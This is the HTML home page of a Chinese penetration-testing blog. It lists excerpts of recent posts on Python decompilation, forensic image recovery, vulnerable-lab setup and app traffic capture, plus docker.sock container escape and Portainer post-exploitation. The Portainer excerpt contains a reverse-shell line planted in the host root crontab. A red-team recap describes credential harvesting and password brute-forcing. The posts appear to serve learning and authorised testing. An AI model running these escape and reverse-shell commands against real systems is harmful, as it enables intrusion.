@@ -1,0 +1,292 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Putdownd’s Blog - 躺平的BLOG</title><meta name="author" content="putdown"><meta name="copyright" content="putdown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Welcome to lie down"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "Putdownd’s Blog",
+  "alternateName": [
+    "躺平的BLOG",
+    "blog.putdown.top"
+  ],
+  "url": "https://blog.putdown.top/"
+}</script><link rel="shortcut icon" href="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png"><link rel="canonical" href="https://blog.putdown.top/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-t8FWZKLQce"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f755324450eb55ec18bb83a2d2f2334e";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Putdownd’s Blog',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.1.0/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntimes.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Putdownd’s Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://t.alcy.cc/fj);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">128</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(https://t.alcy.cc/fj);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Putdownd’s Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="site-info"><h1 id="site-title">Putdownd’s Blog</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/futalk" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:burpburpsuite@outlook.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://steamcommunity.com/profiles/76561198384837505/" rel="external nofollow noreferrer" target="_blank" title="Steam"><i class="fa-brands fa-steam" style="color: #00adee;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa-solid fa-square-rss" style="color: #f26522;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/52ee58b1.html" title="逆向python打包exe程序获取源代码">逆向python打包exe程序获取源代码</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-08-20T02:57:05.216Z" title="发表于 2025-08-20 02:57:05">2025-08-20</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/">运维开发</a></span></div><div class="content">准备 python环境 使用软件: pyinstxtractor.py    pycdc &#x2F; uncompyle6  exe反编译到pyc 判断,这个图标是py打包的程序  使用pyinstxtractor.py来反编译exe  在运行的文件下会得到一个文件夹,文件内会有个同名的pyc后缀的文件(遇到过不是同名的自行判断)   pyc到源码在线工具 https://rivers.chaitin.cn/tools/pyc2py https://tool.lu/pyc/ https://www.lddgo.net/string/pyc-compile-decompile  工具 可使用的工具有pycdc &#x2F; uncompyle6 使用过程中uncompyle6有许多奇奇怪怪的报错,pycdc会比较省事但需要手动编译(参考上篇文章) 使用pycdc来还原,和上面在线大的代码是一样的,还原成功  </div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/ddbf221.html" title="pycdc在windows下编译">pycdc在windows下编译</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-08-19T08:08:13.191Z" title="发表于 2025-08-19 08:08:13">2025-08-19</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/">运维开发</a></span></div><div class="content">环境配置 vscode 这个就不用多说了 安装cmake插件   gcc环境 下载: https://winlibs.com/ 配置环境变量   pycdc 源码: https://github.com/zrax/pycdc.git    编译 下载pycdc源码 使用vscode打开,安装插件    按ctrl+shift+p    选择gcc编译,编译完成   </div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/-3b062c9.html" title="镜像运行(vmdk在vmware运行)">镜像运行(vmdk在vmware运行)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-08-19T02:39:31.473Z" title="发表于 2025-08-19 02:39:31">2025-08-19</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/">运维开发</a></span></div><div class="content">衔接上文 上一篇文章是吧E01的镜像转换为了vmdk格式,并在虚拟机进行了挂载 今天是把镜像实在虚拟机里面完整跑起来  准备工作 vmdk格式的镜像文件 vmware虚拟机啊  开始 首先新建虚拟机,选择自定义  默认下一步  稍后安装  看恢复的系统,这次是windows就选择了windows  自定义名称路径  固件类型选在bios  按需配置cpu及内存  因为是镜像恢复就不联网了  控制器类型,默认  磁盘类型scsi  使用现有的虚拟机  选择要跑的vmdk文件  保持现有格式  完成   结束 最近有点老年痴呆,简单记录下过程  </div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/-1b5705c7.html" title="镜像恢复记录">镜像恢复记录</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-08-18T06:49:43.929Z" title="发表于 2025-08-18 06:49:43">2025-08-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/">运维开发</a></span></div><div class="content">镜像文件恢复前期准备工作 需要恢复的文件为 E01格式的文件,是 EnCase的压缩格式,一般用于取证 使用工具: qemu  ftk image  vmware  wmware已经运行的win10 踩坑点: qemu无法识别 E01格式的文件无法直接转换,需要 ftk image来转换  E01转换为RAW 使用ftk image来转换文件 文件    使用 ftk image 导入      添加进来后能看镜像内的到系统文件    然后导出文件为 raw格式     填入要出的文件地址和文件名,文件大小 1500建议改为 0,会是一整个文件,不然会变成好多个文件不便于使用 qemu来恢复    经过漫长的等待就导出成功了  RAW转换VMDK qume转raw为vmdk  一行命令   1qemu-img.exe convert -p -O vmdk &quot;转换前的文件&quot; &quot;转换后的文件&quot;  1qemu-img.exe convert -p -O vmdk &quot;ftk转换的raw的镜像&quot; &quot;001.vmdk&qu...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/-68282f3d.html" title="若依漏洞环境搭建（4.5版本）">若依漏洞环境搭建（4.5版本）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-02-25T06:38:58.154Z" title="发表于 2025-02-25 06:38:58">2025-02-25</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/">运维开发</a></span></div><div class="content">Windows搭建环境 若依源码：https://codeload.github.com/yangzongzhuan/RuoYi/zip/refs/tags/v4.5.0 工具：IDEA Ultimate phpstudy（mysql） java1.8 navicat（数据库连接工具）  mysql配置 使用phpstudy内的环境  设置允许远程访问mysql数据库  执行以下命令可使用navicat进行连接   12345use mysql; grant all privileges on *.* to root@&#x27;%&#x27; identified by &#x27;密码&#x27;;flush privileges;  导入数据库 新建数据库ry  运行源码内的两个sql文件，两个都要导入  导入后为以下表   IDEA Ultimate 使用idea打开若依的源码文件  修改数据库连接文件  打开个选项设置  点击运行  等等就运行起来了，默认在80端口   一些设置shiro key的位置 首页密码自动填充问题 直接删除value的值即可  漏洞测试 使用...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/44f6325c.html" title=" APP&amp;WX小程序抓包"> APP&amp;WX小程序抓包</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-02-12T02:45:47.073Z" title="发表于 2025-02-12 02:45:47">2025-02-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="content">app抓包 模拟器：雷电模拟器（安卓7.1）  抓包工具：sunny抓包工具、burpsuite   模拟器设置 打开root模式  安装证书，未安装证书的话抓取https的网站会显示不是私密链接  下载后在模拟器内安装，点击设置证书  sunny添加模拟器  再次访问https网站，发现不会报错可正常抓包  app测试   WX小程序 拦截进程  sunny联动burpsuite 设置上游网关为burpsuite的代理即可  </div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/30d0d94e.html" title="无法拉取镜像的环境下进行docker.sock 逃逸">无法拉取镜像的环境下进行docker.sock 逃逸</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-12-24T07:24:36.947Z" title="发表于 2024-12-24 07:24:36">2024-12-24</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/">运维开发</a></span></div><div class="content"> 报错信息：  1docker: Error response from daemon: Get &quot;https://registry-1.docker.io/v2/&quot;: proxyconnect tcp: dial tcp 192.168.88.172:7897: connect: connection refused.  12docker imagesdocker save -o alpine_latest.tar alpine:latest   导入镜像逃逸 在要逃逸的容器内执行 下载制作好的镜像  1curl http://192.168.x.x:8000/alpine_latest.tar -o /tmp/alpine_latest.tar  1/tmp/docker/docker load -i /tmp/alpine_latest.tar  1/tmp/docker/docker -H unix:///run/docker.sock run -v /:/mnt -it alpine sh     成功逃逸   </div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/4f2890e7.html" title="Portainer后渗透">Portainer后渗透</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-12-07T02:15:46.162Z" title="发表于 2024-12-07 02:15:46">2024-12-07</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="content">前言  1docker -H unix:///run/docker.sock run -v /:/test -it ubuntu:latest /bin/bash  1Get &quot;https://registry-1.docker.io/v2/&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)  Portainer 的后渗透 更换镜像源  新建容器          逃逸 1echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/root   结束</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/19649a6.html" title="一次带队护网">一次带队护网</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-10-11T09:04:08.034Z" title="发表于 2024-10-11 09:04:08">2024-10-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%8A%A4%E7%BD%91-CTF/">护网/CTF</a></span></div><div class="content">前言 因为参加了上一届的护网，大致知道本届的一些流程情况 比赛持续十天共抽取三个目标，完成目标后形成报告去裁判评分，进行排名  过程目标一 该目标为供应链公司，为名下企业提供技术支持 裁判认定为打穿  外网 在外网信息收集阶段发现重要系统：nacos 、xxl-job、minio 通过nacos权限认证绕过导出配置，在配置文件发现xxl-job、minio账号密码 在minio内发现该公司相关文件，并找到与员工相关文件得到工号信息 使用工号爆破sso，设置密码为123456，成功找到一些账户并使用公司的导航主页，比较重要的系统是企业邮箱为后续埋下伏笔  内网 内网入口为xxl-job反弹shell 通过入口开始扫描和搭建代理 通过fscan对内网进行扫描找到一些ssh、数据库弱口令等常规扫描信息 在zabbix的数据库内发现有运维的邮箱和密码，登陆后可以看到与下属公司的邮件往来，并发现该公司的&quot;祖传密码&quot; 通过收集到密码组成密码本对该公司内网的ssh和数据库进行爆破共找到约200台可连接的linux 在数据库找到和sso相关的表，通过解密对一些主要人员的账号进...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/archives/2c09554a.html" title="ARL（灯塔）删库后使用docker搭建ARL（灯塔）">ARL（灯塔）删库后使用docker搭建ARL（灯塔）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-05-14T03:31:00.000Z" title="发表于 2024-05-14 03:31:00">2024-05-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="content"> docker 保存命令把镜像保存为本地文件  1234docker tag cd80881c4e0e rabbitmq:localdocker save tophant/arl -o arl.tardocker save mongo -o mongo.tardocker save rabbitmq -o rabbitmq.tar    修改docker-compose.yml的文件 主要修改： tophant/arl:${ARL_VERSION:-latest} 改为 image: tophant/arl:local 以此类推。 以下为修改后。  1docker load &lt; rabbitmq.tar   创建文件  1docker volume create arl_db   启动    注意 数据不会保留 及时更改密码  </div></div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/#content-inner">13</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">putdown</div><div class="author-info-description">Welcome to lie down</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">128</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://putdown.top/"><i class="fa-solid fa-window-restore"></i><span>我的网站列表</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/futalk" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:burpburpsuite@outlook.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://steamcommunity.com/profiles/76561198384837505/" rel="external nofollow noreferrer" target="_blank" title="Steam"><i class="fa-brands fa-steam" style="color: #00adee;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa-solid fa-square-rss" style="color: #f26522;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网站的目的仅限用于分享和学习！ 如果有错误的地方请多多批评指正，我会第一时间进行修改。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/52ee58b1.html" title="逆向python打包exe程序获取源代码">逆向python打包exe程序获取源代码</a><time datetime="2025-08-20T02:57:05.216Z" title="发表于 2025-08-20 02:57:05">2025-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/ddbf221.html" title="pycdc在windows下编译">pycdc在windows下编译</a><time datetime="2025-08-19T08:08:13.191Z" title="发表于 2025-08-19 08:08:13">2025-08-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/-3b062c9.html" title="镜像运行(vmdk在vmware运行)">镜像运行(vmdk在vmware运行)</a><time datetime="2025-08-19T02:39:31.473Z" title="发表于 2025-08-19 02:39:31">2025-08-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/-1b5705c7.html" title="镜像恢复记录">镜像恢复记录</a><time datetime="2025-08-18T06:49:43.929Z" title="发表于 2025-08-18 06:49:43">2025-08-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/-68282f3d.html" title="若依漏洞环境搭建（4.5版本）">若依漏洞环境搭建（4.5版本）</a><time datetime="2025-02-25T06:38:58.154Z" title="发表于 2025-02-25 06:38:58">2025-02-25</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Kubernetes%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">Kubernetes安全</span><span class="card-category-list-count">15</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Vulnhub%E9%9D%B6%E6%9C%BA/"><span class="card-category-list-name">Vulnhub靶机</span><span class="card-category-list-count">30</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">Web安全</span><span class="card-category-list-count">30</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"><span class="card-category-list-name">云安全</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%85%B3/"><span class="card-category-list-name">博客相关</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%8A%A4%E7%BD%91-CTF/"><span class="card-category-list-name">护网/CTF</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="card-category-list-name">渗透测试</span><span class="card-category-list-count">25</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/"><span class="card-category-list-name">运维开发</span><span class="card-category-list-count">15</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/XSS-labs/" style="font-size: 1.1em; color: #999">XSS-labs</a> <a href="/tags/%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/" style="font-size: 1.1em; color: #999">默认密码</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.1em; color: #999">操作系统&数据库</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 1.39em; color: #99a4b4">信息收集</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.1em; color: #999">文件包含</a> <a href="/tags/%E6%90%9C%E7%B4%A2/" style="font-size: 1.16em; color: #999b9e">搜索</a> <a href="/tags/nmap/" style="font-size: 1.1em; color: #999">nmap</a> <a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/" style="font-size: 1.5em; color: #99a9bf">云原生</a> <a href="/tags/%E9%87%8D%E8%A6%81%E7%AB%AF%E5%8F%A3/" style="font-size: 1.1em; color: #999">重要端口</a> <a href="/tags/DVWA/" style="font-size: 1.21em; color: #999ea4">DVWA</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.16em; color: #999b9e">文件上传</a> <a href="/tags/sql-labs/" style="font-size: 1.44em; color: #99a7ba">sql-labs</a> <a href="/tags/PostgreSQL/" style="font-size: 1.1em; color: #999">PostgreSQL</a> <a href="/tags/http/" style="font-size: 1.33em; color: #99a2af">http</a> <a href="/tags/SqlServer/" style="font-size: 1.1em; color: #999">SqlServer</a> <a href="/tags/upload-labs/" style="font-size: 1.16em; color: #999b9e">upload-labs</a> <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/" style="font-size: 1.1em; color: #999">编辑器</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 1.16em; color: #999b9e">护网</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 1.21em; color: #999ea4">环境搭建</a> <a href="/tags/Windows/" style="font-size: 1.21em; color: #999ea4">Windows</a> <a href="/tags/OWASP/" style="font-size: 1.1em; color: #999">OWASP</a> <a href="/tags/%E6%9C%AF%E8%AF%AD/" style="font-size: 1.16em; color: #999b9e">术语</a> <a href="/tags/Burp-Suite/" style="font-size: 1.39em; color: #99a4b4">Burp Suite</a> <a href="/tags/python/" style="font-size: 1.21em; color: #999ea4">python</a> <a href="/tags/Docker/" style="font-size: 1.44em; color: #99a7ba">Docker</a> <a href="/tags/sqlmap/" style="font-size: 1.1em; color: #999">sqlmap</a> <a href="/tags/MySQL/" style="font-size: 1.1em; color: #999">MySQL</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 1.16em; color: #999b9e">逆向</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 1.1em; color: #999">暴力破解</a> <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 1.16em; color: #999b9e">云安全</a> <a href="/tags/XSS/" style="font-size: 1.16em; color: #999b9e">XSS</a> <a href="/tags/hexo/" style="font-size: 1.27em; color: #99a0a9">hexo</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.44em; color: #99a7ba">漏洞复现</a> <a href="/tags/Linux/" style="font-size: 1.21em; color: #999ea4">Linux</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" style="font-size: 1.1em; color: #999">命令注入</a> <a href="/tags/Kubernetes-Goat/" style="font-size: 1.5em; color: #99a9bf">Kubernetes Goat</a> <a href="/tags/metasploit/" style="font-size: 1.16em; color: #999b9e">metasploit</a> <a href="/tags/Oracle/" style="font-size: 1.1em; color: #999">Oracle</a> <a href="/tags/CSRF/" style="font-size: 1.1em; color: #999">CSRF</a> <a 